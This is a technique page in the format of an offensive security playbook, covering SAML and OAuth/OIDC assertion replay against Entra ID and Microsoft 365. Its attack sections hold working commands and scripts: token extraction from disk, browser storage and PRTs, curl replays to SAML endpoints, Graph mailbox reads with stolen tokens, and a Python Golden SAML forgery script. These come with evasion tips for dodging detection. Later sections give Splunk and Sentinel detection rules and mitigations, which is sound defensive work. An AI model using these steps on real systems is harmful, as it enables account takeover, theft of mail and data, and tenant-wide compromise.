# [LM-AUTH-026]: Authentication Assertion Replay

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-026 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, OAuth 2.0/OIDC Applications |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID versions, OAuth 2.0 implementations without replay protection |
| **Patched In** | Mitigations via Token Protection (Conditional Access P1+), PKCE, short-lived tokens |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Authentication assertion replay is an attack where an attacker intercepts and reuses a valid authentication token, SAML assertion, or OAuth/OIDC ID token to gain unauthorized access to a protected application or resource without the original user's participation. The attacker captures the assertion during its lifecycle and replays it before the assertion expires, allowing the attacker to impersonate the legitimate user. This bypass does not require credential theft or MFA circumvention if the assertion is used within its validity window.

**Attack Surface:** OAuth 2.0/OIDC authorization endpoints, SAML assertion consumer services (ACS), cloud identity tokens (PRT, access tokens), session cookies, and authentication proxies.

**Business Impact:** **Complete account takeover of any user whose token is captured.** An attacker can access all resources the legitimate user can access—cloud applications, M365 services, Azure subscriptions, and any integrated SaaS platform—without triggering MFA challenges. In high-value scenarios (admin tokens), this leads to tenant-wide compromise.

**Technical Context:** The attack succeeds because authentication protocols traditionally validate token syntax, expiration, and signature, but do not automatically prevent token reuse by unauthorized parties. Modern mitigations (Token Protection, PKCE, nonce validation) require explicit implementation. Most organizations with weak token lifecycle management remain vulnerable.

### Operational Risk

- **Execution Risk:** Low – Requires only interception (MITM, malware on endpoint, cloud log access). No exploitation needed.
- **Stealth:** Medium – Legitimate token usage generates expected audit logs; detection depends on behavioral anomalies (geographic impossibility, device mismatches).
- **Reversibility:** No – Token has already authenticated the attacker. Requires immediate token revocation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.1 | Ensure that Multi-factor Authentication is enabled for all non-service accounts |
| **DISA STIG** | SI-2 | Information System Monitoring |
| **CISA SCuBA** | Entra.1 | Enforce MFA |
| **NIST 800-53** | IA-2(1) | Multi-Factor Authentication |
| **GDPR** | Art. 32 | Security of Processing – implement appropriate encryption |
| **DORA** | Art. 9 | Protection and Prevention – cryptographic controls |
| **NIS2** | Art. 21 | Cyber Risk Management – incident detection capabilities |
| **ISO 27001** | A.9.2.1 | User Registration and De-registration |
| **ISO 27005** | 7.4.2 | Risk Treatment – implement token binding controls |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** None for exploitation; attacker only needs to intercept or obtain a valid token.
- **Required Access:** Network-level access to token transmission channels, endpoint malware, or cloud log access (if tokens logged insecurely).

**Supported Platforms:**
- **OAuth 2.0/OIDC:** All versions (RFC 6749, RFC 6750, OpenID Connect Core 1.0+)
- **SAML:** SAML 2.0 and above
- **Entra ID:** All versions
- **M365 Applications:** Exchange Online, SharePoint, Teams, Microsoft Graph

**Tools & Dependencies:**
- Network sniffer (tcpdump, Wireshark)
- Proxy tool (Burp Suite, Fiddler) for HTTPS inspection
- OAuth debugging tools (OAuth.io, authcode.dev)
- Cloud CLI tools (Azure CLI, MS Graph PowerShell) for token manipulation

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Identifying Token Exposure Points

**PowerShell – Check Token Caching**

```powershell
# List cached OAuth tokens on Windows endpoint
$tokenPath = "$env:USERPROFILE\.Azure\accessTokens.json"
if (Test-Path $tokenPath) {
    Get-Content $tokenPath | ConvertFrom-Json | Select-Object -Property * | Format-List
}

# Alternative: Extract from TokenBroker (WinRT)
Get-ItemProperty -Path "HKCU:\Software\Microsoft\AuthenticationManager\" -ErrorAction SilentlyContinue
```

**What to Look For:**
- Unencrypted token files in user profiles (C:\Users\[username]\.Azure, C:\Users\[username]\.m365auth)
- Tokens with long expiration times (>1 hour)
- Tokens stored in plaintext in environment variables or config files

### Reconnaissance – Identifying Weak Token Validation

```powershell
# Test SAML assertion expiration window
$samlAssertion = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64SamlResponse))
$xml = [xml]$samlAssertion
$notOnOrAfter = $xml.Response.Assertion.Conditions.NotOnOrAfter
Write-Output "Token expires at: $notOnOrAfter"

# Calculate remaining validity
$expiryTime = [DateTime]::Parse($notOnOrAfter)
$timeRemaining = $expiryTime - (Get-Date).ToUniversalTime()
Write-Output "Time remaining: $($timeRemaining.TotalSeconds) seconds"
```

**What to Look For:**
- Assertion validity > 5 minutes (ideal is 1-3 minutes)
- Missing `NotBefore` or `NotOnOrAfter` attributes
- Missing nonce validation in OIDC flows

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: SAML Assertion Replay (Federation/SSO Applications)

**Supported Versions:** All SAML 2.0 implementations with Entra ID or AD FS

#### Step 1: Intercept SAML Assertion

**Objective:** Capture a valid SAML response before it reaches the Service Provider (SP).

**Command (via Burp Suite or Proxy):**

```text
1. Enable proxy (Burp, Fiddler, or mitmproxy)
2. Configure browser to route through proxy
3. Initiate SAML login flow (navigate to SP)
4. Redirect to IdP (Entra ID or AD FS)
5. Complete MFA and authentication
6. Intercept the POST response to SP containing SAMLResponse parameter
7. Right-click → Save/Copy the full SAML assertion (XML)
```

**Expected Output:**

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" 
  ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6" 
  Version="2.0" 
  IssueInstant="2026-01-10T12:00:00Z" 
  Destination="https://app.contoso.com/saml/acs">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" 
    ID="_bec424fa5103428909a30ff1e31168327f79474984" 
    Version="2.0" 
    IssueInstant="2026-01-10T12:00:00Z">
    <saml:Conditions NotBefore="2026-01-10T11:55:00Z" NotOnOrAfter="2026-01-10T12:05:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>https://app.contoso.com</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:Subject>
      <saml:NameID>user@contoso.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**What This Means:**
- Response ID and Assertion ID are unique identifiers (IdP must track these to prevent replay)
- `NotOnOrAfter="2026-01-10T12:05:00Z"` indicates the assertion is valid for 10 minutes
- If the SP does not track used assertion IDs, the same response can be reused multiple times

**OpSec & Evasion:**
- Use HTTPS only (avoid unencrypted transmission)
- Capture during a legitimate user's session (avoids unusual login patterns)
- Replay within the assertion validity window (typically 3-10 minutes)
- Detection likelihood: Medium – Behavioral analytics may flag multiple logins from the same location

**Troubleshooting:**
- **Error:** "Invalid signature" or "Assertion validation failed"
  - **Cause:** The assertion was modified during interception
  - **Fix:** Ensure the XML is captured without alteration; use raw request copy from proxy
- **Error:** "Assertion already processed" (if SP implements tracking)
  - **Cause:** Service Provider has seen this assertion ID before
  - **Fix:** This means the target SP implements proper replay protection; technique will not work

#### Step 2: Craft Replay Request

**Objective:** Prepare the intercepted SAML assertion for replay to the SP's ACS endpoint.

**Command (via cURL):**

```bash
# Base64 encode the SAML response (if needed)
SAML_RESPONSE=$(cat saml_response.xml | base64 | tr -d '\n')

# URL encode the Base64 response
ENCODED_SAML=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$SAML_RESPONSE'))")

# Craft POST request to ACS
curl -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "SAMLResponse=${ENCODED_SAML}&RelayState=/" \
  https://app.contoso.com/saml/acs \
  -b "cookies.txt" \
  -c "cookies.txt" \
  -v
```

**Expected Output:**

```
< HTTP/1.1 302 Found
< Location: https://app.contoso.com/dashboard
< Set-Cookie: session=abc123...; Path=/; Secure; HttpOnly
```

**What This Means:**
- HTTP 302 redirect to dashboard indicates successful authentication
- Session cookie is issued, granting authenticated access

**OpSec & Evasion:**
- Replay from a different network IP (VPN, proxy) to avoid same-IP detection
- Replay from a different browser/user-agent to evade fingerprinting
- Detection likelihood: High if geo-velocity checks are enabled (user logged in from 1000+ km away within seconds)

#### Step 3: Verify Access

**Objective:** Confirm authenticated session and access to protected resources.

**Command:**

```bash
curl -H "Cookie: session=abc123..." https://app.contoso.com/api/user/profile -v
```

**Expected Output:**

```json
{
  "user_id": "12345",
  "email": "user@contoso.com",
  "name": "John Doe",
  "roles": ["user"]
}
```

**What This Means:**
- 200 OK response with user data indicates successful replay and authentication bypass

---

### METHOD 2: OAuth/OIDC Token Replay (Cloud SaaS & M365)

**Supported Versions:** All OAuth 2.0 and OpenID Connect implementations (RFC 6749, OpenID Connect Core 1.0+)

#### Step 1: Intercept Access Token or ID Token

**Objective:** Obtain a valid OAuth access token or OIDC ID token from a legitimate user session.

**Command (via Browser DevTools or Burp):**

```javascript
// Extract token from browser localStorage or sessionStorage
const accessToken = localStorage.getItem('access_token');
const idToken = localStorage.getItem('id_token');
console.log('Access Token:', accessToken);
console.log('ID Token:', idToken);

// Decode JWT to inspect claims (use jwt.io or script below)
const parts = accessToken.split('.');
const header = JSON.parse(atob(parts[0]));
const payload = JSON.parse(atob(parts[1]));
console.log('Token Claims:', payload);
console.log('Expires At:', new Date(payload.exp * 1000));
```

**Expected Output:**

```json
{
  "aud": "https://graph.microsoft.com",
  "iss": "https://login.microsoftonline.com/12345-tenant-id/v2.0",
  "iat": 1704873600,
  "exp": 1704877200,
  "email": "user@contoso.com",
  "scp": "Mail.Read Mail.ReadWrite User.Read"
}
```

**What This Means:**
- Token is valid for 1 hour (1704877200 is ~3600 seconds from issuance)
- Scopes (`scp`) indicate the token can read and write mail and read user profile
- Attacker can use this token to access Microsoft Graph on behalf of the user

**Variant (Entra ID Primary Refresh Token - PRT):**

```powershell
# Extract PRT from Entra joined machine
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"
$prtValue = Get-ItemProperty -Path $regPath -Name "PRT"

# Or via cmdlet (requires admin)
dsregcmd /status | findstr /i "prt"
```

**What This Means:**
- PRTs are long-lived tokens (days/weeks) used to request new short-lived access tokens
- PRT replay allows attackers to continuously refresh access without re-authentication

**OpSec & Evasion:**
- Extract tokens from process memory (lsass, browser process) rather than disk
- Use encrypted channels (HTTPS, VPN) during token exfiltration
- Detection likelihood: Low initially (legitimate token usage), High if correlated with device/location anomalies

#### Step 2: Replay Token to API

**Objective:** Use the intercepted token to authenticate API requests without the user's knowledge.

**Command (via cURL or PowerShell):**

```bash
# Microsoft Graph API call using stolen access token
curl -X GET \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Content-Type: application/json" \
  https://graph.microsoft.com/v1.0/me/messages \
  -v
```

**Expected Output:**

```json
{
  "value": [
    {
      "id": "AAMkADA0M2Y0ZmU2LTY2N2Y...",
      "subject": "Confidential Project",
      "from": {"emailAddress": {"address": "boss@contoso.com"}},
      "bodyPreview": "Here are the financial projections..."
    }
  ]
}
```

**What This Means:**
- 200 OK with user's mailbox contents indicates successful token replay
- Attacker can now read all messages, steal attachments, or send emails as the user

**Alternative – Teams/SharePoint:**

```powershell
# Access Teams messages
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/json"
}

Invoke-RestMethod `
  -Uri "https://graph.microsoft.com/v1.0/me/messages?`$filter=from/emailAddress/address eq 'team-chat@contoso.onmicrosoft.com'" `
  -Headers $headers `
  -Method Get
```

**OpSec & Evasion:**
- Use VPN/proxy to mask source IP
- Space API calls over time (avoid burst requests that trigger anomaly detection)
- Restrict data exfiltration volume (avoid downloading entire mailbox in one session)
- Detection likelihood: High if Conditional Access enforces token binding or CAE

#### Step 3: Escalate to Administrative Access (Optional)

**Objective:** Leverage stolen token to pivot to Global Administrator or other high-privilege roles.

**Command:**

```bash
# Enumerate current app permissions
curl -X GET \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants \
  -v

# If token has Directory.Read.All or Directory.ReadWrite.All:
# Enumerate admins
curl -X GET \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members \
  -v
```

**Expected Output:**

```json
{
  "value": [
    {
      "id": "user-id-123",
      "userPrincipalName": "admin@contoso.com",
      "displayName": "Global Admin"
    }
  ]
}
```

**What This Means:**
- Token has enough permissions to enumerate Entra ID roles
- Attacker can identify high-value targets (admins) for further compromise

**OpSec & Evasion:**
- If the stolen token is an admin token, it already has full access—no escalation needed
- Detection likelihood: Very High – Unusual API patterns (role enumeration) trigger Defender for Cloud Apps alerts

---

### METHOD 3: SAML Golden SAML-Style Assertion Forgery (If Key Compromised)

**Supported Versions:** AD FS and hybrid Entra ID + AD FS environments

**Note:** This requires compromised IdP signing key (see CA-FORGE-001_Golden_SAML.md for full technique). This section covers assertion replay variant when the original assertion is still valid.

#### Step 1: Obtain or Forge SAML Assertion with Admin Claims

**Objective:** Create a SAML assertion that claims administrative privileges.

**Command (via SAML toolkit if key is compromised):**

```python
from signxml import XMLSigner
from lxml import etree
import base64
from datetime import datetime, timedelta

# Load compromised IdP signing key
with open("adfs_signing_key.pem", "r") as f:
    private_key = f.read()

# Craft SAML assertion with Global Admin claim
saml_template = f"""<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="_unique-id-{datetime.now().timestamp()}"
  Version="2.0"
  IssueInstant="{datetime.utcnow().isoformat()}Z">
  <saml:Conditions NotBefore="{datetime.utcnow().isoformat()}Z" 
    NotOnOrAfter="{(datetime.utcnow() + timedelta(minutes=5)).isoformat()}Z">
    <saml:AudienceRestriction>
      <saml:Audience>urn:federation:MicrosoftOnline</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:Subject>
    <saml:NameID>admin@contoso.com</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData NotOnOrAfter="{(datetime.utcnow() + timedelta(minutes=5)).isoformat()}Z" />
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:AuthnStatement AuthnInstant="{datetime.utcnow().isoformat()}Z">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
    </saml:AuthnContext>
  </saml:AuthnStatement>
  <saml:AttributeStatement>
    <saml:Attribute Name="http://schemas.microsoft.com/identity/claims/objectidentifier" NameFormat="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
      <saml:AttributeValue>admin-oid-12345</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="http://schemas.microsoft.com/identity/claims/tenantid" NameFormat="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
      <saml:AttributeValue>tenant-id-12345</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>"""

# Sign the assertion
signer = XMLSigner(signature_algorithm="rsa-sha256", digest_algorithm="sha256")
signed = signer.sign(etree.fromstring(saml_template.encode()), key=private_key)
signed_assertion = etree.tostring(signed, encoding='unicode')

# Encode for transmission
encoded = base64.b64encode(signed_assertion.encode()).decode()
print(f"SAMLResponse={encoded}")
```

**Expected Output:**

A Base64-encoded, digitally signed SAML assertion that claims to be from the IdP with admin attributes.

**What This Means:**
- The forged assertion is signed with the IdP's private key, making it appear legitimate
- Any SP that trusts the IdP will accept this assertion as valid
- No MFA or password is required

**OpSec & Evasion:**
- Use a different assertion ID each time (avoid duplicate tracking)
- Vary the `IssueInstant` timestamp to avoid exact-match deduplication
- Detection likelihood: Very High if ADFS key compromise is detected; Medium if using naturally-looking timestamps

---

## 6. TOOLS & COMMANDS REFERENCE

### SAMLTool

**URL:** https://www.samltool.com/

**Version:** Online tool (version-agnostic)

**Usage:** Decode, validate, and forge SAML assertions in a GUI environment.

```text
1. Visit https://www.samltool.com/
2. Paste intercepted SAMLResponse in "SAML Response" field
3. Click "Decode SAML Response"
4. Analyze NotBefore, NotOnOrAfter, assertion ID, etc.
5. For forging: Use "Create SAML Response" tab (requires private key)
```

### jwt.io

**URL:** https://jwt.io/

**Version:** Online decoder

**Usage:** Decode and inspect JWT claims (OIDC ID tokens, OAuth access tokens).

```bash
# Copy access token from browser console or interceptor
# Paste at jwt.io
# Inspect: exp (expiration), aud (audience), scp (scopes), upn (user principal name)
```

### Burp Suite Professional

**URL:** https://portswigger.net/burp

**Version:** 2023.x+

**Usage:** Intercept SAML/OAuth flows, modify assertions, replay requests.

```text
1. Proxy → Intercept → Enable intercept
2. Initiate login flow through Burp
3. Burp captures SAML POST or OAuth redirect
4. Right-click → "Send to Repeater"
5. Modify parameters, resend
6. Analyze response
```

### Fiddler Classic

**URL:** https://www.telerik.com/fiddler

**Version:** 5.0+

**Usage:** Intercept HTTPS traffic, inspect token exchanges.

```text
Windows + R → fiddler.exe
Tools → Options → HTTPS → Decrypt HTTPS traffic
Repeat OAuth login; inspect captured requests/responses
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Repeated SAML Assertion Usage (Replay Detection)

**Rule Configuration:**
- **Required Index:** `o365:audit`, `splunk_ecosystem:azure:audit`
- **Required Sourcetype:** `azure:aad:signin`, `msexchange:audit`
- **Required Fields:** `AssertionID`, `timestamp`, `user`
- **Alert Threshold:** Same AssertionID seen >1 time within 10-minute window
- **Applies To Versions:** All

**SPL Query:**

```spl
index=o365:audit OR index=splunk_ecosystem:azure:audit
(eventType=SignInLogs OR Operation=UserLoggedIn)
| rex field=raw_data "AssertionID=(?P<assertion_id>[^&]+)"
| stats count, latest(timestamp) as last_time by assertion_id, user
| where count > 1
| eval time_diff=round((last_time - earliest_time) / 60, 2)
| where time_diff <= 10
| table assertion_id, user, count, time_diff, last_time
```

**What This Detects:**
- Multiple authentications using the same SAML assertion ID within a short timeframe
- Indicates assertion replay (legitimate SAML should not reuse assertion IDs)

**Manual Configuration Steps:**
1. Log into Splunk Web
2. Search & Reporting → Create New → Alert
3. Paste SPL query above
4. Set **Trigger Condition** to `count > 0`
5. Configure **Action** → Email alert to SOC

**False Positive Analysis:**
- **Legitimate Activity:** Transient network issues causing session retry with same assertion
- **Benign Tools:** Load balancers or reverse proxies caching SAML responses
- **Tuning:** Exclude known load balancer IPs: `| where NOT(src_ip IN ("10.0.1.10", "10.0.1.11"))`

### Rule 2: Token Replay from Anomalous Location

**Rule Configuration:**
- **Required Index:** `azure:signin:logs`
- **Required Fields:** `UserPrincipalName`, `IPAddress`, `Location`, `timestamp`, `RefreshTokenUsed`
- **Alert Severity:** High
- **Applies To Versions:** All Entra ID versions

**SPL Query:**

```spl
index=azure:signin:logs RefreshTokenUsed=true
| stats earliest(timestamp) as first_signin, latest(timestamp) as last_signin, 
  values(Location) as locations, values(IPAddress) as ips by UserPrincipalName
| eval time_diff_minutes = round((last_signin - first_signin) / 60, 2)
| where time_diff_minutes <= 5 AND mvcount(locations) > 1
| eval geographical_distance = "requires_manual_calculation"
| where time_diff_minutes < 15 AND locations != ""
| table UserPrincipalName, first_signin, last_signin, locations, ips, time_diff_minutes
```

**What This Detects:**
- User authenticating from two different geographic locations within 5 minutes
- Indicates stolen token being replayed from attacker's location

**Manual Configuration Steps:**
1. Navigate to **Splunk Web** → **Alerts** → **Create New Alert**
2. Paste query above
3. **Trigger Condition:** `count > 0`
4. **Run on:** Every 15 minutes
5. **Action:** Send email, create incident in SIEM

**False Positive Analysis:**
- **Legitimate Activity:** VPN failover, roaming user (cached token used while traveling)
- **Benign Tools:** Mobile app token refresh from airplane mode
- **Tuning:** `| where NOT(User_Agent LIKE "%mobile%")`

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: SAML Assertion Replay Detection

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `AuditLogs`
- **Required Fields:** `SAML AssertionID`, `UserPrincipalName`, `TimeGenerated`, `IPAddress`
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All Entra ID

**KQL Query:**

```kusto
SigninLogs
| where isnotempty(AssertionID)
| summarize AssertionCount = count(), 
  UniqueUsers = dcount(UserPrincipalName),
  UniqueIPs = dcount(IPAddress),
  TimeWindow = arg_max(TimeGenerated, TimeGenerated) by AssertionID
| where AssertionCount > 1 and TimeWindow > ago(10m)
| extend IsReplayAttack = iff(UniqueIPs > 1, true, false)
| where IsReplayAttack == true
```

**What This Detects:**
- Single SAML assertion being used by multiple users or from multiple IP addresses
- Classic indicator of assertion replay attack

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `SAML Assertion Replay Detection`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste KQL query above
   - Run every: `5 minutes`
   - Lookup data from last: `2 hours`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Set entity mapping: **Account** → `UserPrincipalName`, **IP** → `IPAddress`
7. Click **Review + create**

### Query 2: OAuth Token Replay via Impossible Travel

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `CloudAppEvents`
- **Required Fields:** `UserPrincipalName`, `IPAddress`, `Location`, `TimeGenerated`, `TokenAge`
- **Alert Severity:** High
- **Frequency:** Every 10 minutes

**KQL Query:**

```kusto
let TimeWindow = 10m;
let MinTravelSpeed = 900; // km/h (speed of commercial flight)
SigninLogs
| where TimeGenerated > ago(1d)
| sort by UserPrincipalName, TimeGenerated
| extend PreviousLogin = prev(TimeGenerated), 
  PreviousIP = prev(IPAddress),
  PreviousLocation = prev(Location)
| where UserPrincipalName == prev(UserPrincipalName)
  and not(isempty(PreviousLocation))
  and PreviousLogin > ago(TimeWindow)
| extend TimeDiff_Minutes = (TimeGenerated - PreviousLogin) / 1m,
  DistanceKm = iff(Location != PreviousLocation, 1000, 0) // Placeholder; use GeoIP in production
| where TimeDiff_Minutes < 30 and DistanceKm > (MinTravelSpeed * (TimeDiff_Minutes / 60))
| project UserPrincipalName, TimeGenerated, IPAddress, Location, 
  PreviousLogin, PreviousIP, PreviousLocation, TimeDiff_Minutes
```

**What This Detects:**
- User appearing to travel faster than a commercial flight (geographical impossibility)
- Strong indicator of token replay from attacker's location

**Manual Configuration Steps (PowerShell):**

```powershell
# Connect to Sentinel workspace
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create analytics rule
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "OAuth Token Replay - Impossible Travel" `
  -Query @'
let TimeWindow = 10m;
SigninLogs
| where TimeGenerated > ago(1d)
| summarize arg_max(TimeGenerated, *) by UserPrincipalName, IPAddress
'@ `
  -Severity "High" `
  -Enabled $true
```

---

## 9. MICROSOFT DEFENDER FOR CLOUD

### Alert 1: "Token Issuer Anomaly"

**Alert Name:** Token Issuer Anomaly (Entra ID Protection)

- **Severity:** High
- **Description:** A token was issued by an anomalous token issuer (e.g., compromised IdP or forged assertion). This may indicate a golden SAML or assertion replay attack.
- **Applies To:** All subscriptions with Entra ID Protection enabled
- **Remediation:**
  1. Navigate to **Azure Portal** → **Entra ID** → **Identity Protection** → **Risk Detections**
  2. Filter by **Token Issuer Anomaly**
  3. Investigate the affected user and sign-in location
  4. If legitimate, dismiss the risk; if not, force password reset and review MFA settings

**Manual Configuration Steps (Enable Defender for Identity):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Under **Defender plans**, enable:
   - **Defender for Identity**: ON
   - **Defender for Cloud Apps**: ON
4. Click **Save**
5. Go to **Alerts** to view token anomalies

---

## 10. WINDOWS EVENT LOG MONITORING

### Event ID: 4776 (Credential Validation)

**Log Source:** Security (Windows Server 2016+)

- **Trigger:** SAML assertion validation or token authentication
- **Filter:** Look for repeated authentications with same assertion ID
- **Applies To Versions:** Server 2016, 2019, 2022, 2025

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies**
3. Enable: **Logon/Logoff** → **Audit Credential Validation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (PowerShell):**

```powershell
# Enable audit for credential validation
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable

# Verify setting
auditpol /get /subcategory:"Credential Validation"
```

---

## 11. CLOUD-NATIVE DETECTION PATTERNS

### Entra ID Sign-in Log Anomalies

**Detection Focus:**
- Multiple sign-in attempts from the same IP with same token within 5 minutes
- Token age field showing reuse (should be <5 min old per legitimate usage)
- Mismatch between device state and Conditional Access policy (e.g., unmanaged device using managed device token)

**KQL Query (Sentinel):**

```kusto
SigninLogs
| where TokenAge > 0 and TokenAge <= 300 // Token is 0-5 minutes old (reused)
| where Status == "0" // Successful login
| summarize Attempts = count() by UserPrincipalName, IPAddress, TimeGenerated
| where Attempts > 3 in 5m // Multiple uses of same token in short window
```

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Implement Token Protection in Conditional Access:**

Entra ID Token Protection binds tokens to the device or session, preventing replay of stolen tokens.

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Token Protection for High-Risk Apps`
4. **Assignments:**
   - **Users:** All users (or specific high-risk groups)
   - **Cloud apps:** Microsoft Exchange Online, SharePoint Online, Teams
   - **Conditions:** Any (or exclude trusted networks)
5. **Access controls:**
   - **Grant:** Require device to be Entra ID joined or compliant
   - **Session:**
     - Enable **"Require Token Protection"** (requires P1+ license)
     - Enable **"Sign-in frequency"** → 1 hour
6. Enable policy: **On**
7. Click **Create**

**Manual Steps (PowerShell):**

```powershell
# Create Conditional Access policy with Token Protection
$policy = @{
    DisplayName = "Token Protection"
    State = "enabled"
    Conditions = @{
        Applications = @{ IncludeApplications = @("00000002-0000-0ff1-ce00-000000000000") } # Exchange
        Users = @{ IncludeUsers = @("All") }
    }
    GrantControls = @{
        Operator = "OR"
        BuiltInControls = @("require_device_compliance")
        CustomAuthenticationFactors = @("token_protection")
    }
    SessionControls = @{
        SignInFrequency = @{
            IsEnabled = $true
            Value = 1
            Type = "hours"
        }
    }
}

New-AzADMSConditionalAccessPolicy -Policy $policy
```

**Enforce Short Token Lifetimes:**

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Applications** → **App registrations** → Select your app
2. **API Permissions**
3. For each permission, ensure **refresh token lifetime** is set to **minimal** (1-7 days)
4. **Token configuration:**
   - Add **access token lifetime**: 1 hour (default is fine)
   - Add **refresh token lifetime**: 7 days (or less)

**Manual Steps (PowerShell):**

```powershell
# Set token lifetimes
$tokenLifePolicy = @{
    AccessTokenLifetime = "01:00:00" # 1 hour
    RefreshTokenLifetime = "7.00:00:00" # 7 days
    IsRefreshTokenIssuedOnRefreshTokenRotation = $true
    RefreshTokenExpiryTime = "7.00:00:00"
}

New-AzADTokenLifetimePolicy @tokenLifePolicy
```

### Priority 2: HIGH

**Implement Continuous Access Evaluation (CAE):**

CAE revokes tokens immediately when risk is detected.

**Manual Steps:**
1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create a policy:
   - Name: `Enable CAE`
   - **Session controls:**
     - Enable **"Use Continuous Access Evaluation"**
3. **Apply to:** Exchange Online, Teams, SharePoint

**Validation Command:**

```powershell
# Verify CAE is enabled
Get-AzADMSConditionalAccessPolicy | Where-Object { $_.SessionControls.ContinuousAccessEvaluation -eq $true }
```

**Implement Strict SAML Assertion Validation:**

**Manual Steps (For SP Administrators):**
1. Configure **Assertion ID Tracking** in your service provider:
   - Maintain a list of processed assertion IDs for the lifetime of the assertion
   - Reject any assertion with an already-seen ID
2. Set **NotOnOrAfter** to 3-5 minutes (tight window)
3. Validate **NotBefore** timestamp (ensure assertion is not from the future)
4. Require **InResponseTo** validation (assertion matches a recent authentication request)

**Pseudocode:**

```python
def validate_saml_assertion(assertion_xml):
    # 1. Check signature
    if not verify_signature(assertion_xml):
        return False, "Invalid signature"
    
    # 2. Check assertion ID uniqueness
    assertion_id = extract_assertion_id(assertion_xml)
    if assertion_id in processed_assertions:
        return False, "Assertion already processed (replay attack)"
    
    # 3. Check timestamps
    not_before = extract_not_before(assertion_xml)
    not_on_or_after = extract_not_on_or_after(assertion_xml)
    now = datetime.utcnow()
    
    if now < not_before:
        return False, "Assertion not yet valid"
    if now >= not_on_or_after:
        return False, "Assertion expired"
    
    # 4. Check validity window (should be short, e.g., 3-5 minutes)
    validity_window = (not_on_or_after - not_before).total_seconds()
    if validity_window > 300:
        return False, "Validity window too large"
    
    # 5. Validate InResponseTo (if present)
    in_response_to = extract_in_response_to(assertion_xml)
    if not validate_in_response_to(in_response_to):
        return False, "InResponseTo validation failed"
    
    # Mark as processed
    processed_assertions[assertion_id] = {
        'timestamp': now,
        'expires_at': not_on_or_after
    }
    
    return True, "Assertion valid"
```

**Enforce HTTPS and TLS 1.2+:**

**Manual Steps (Azure):**
1. **Azure Portal** → **App Service** → Select app
2. **TLS/SSL settings:**
   - Set **Minimum TLS version** to **1.2**
   - Enable **HTTPS Only**
   - Use a modern cipher suite (TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384)

**Validation Command:**

```powershell
# Verify TLS settings
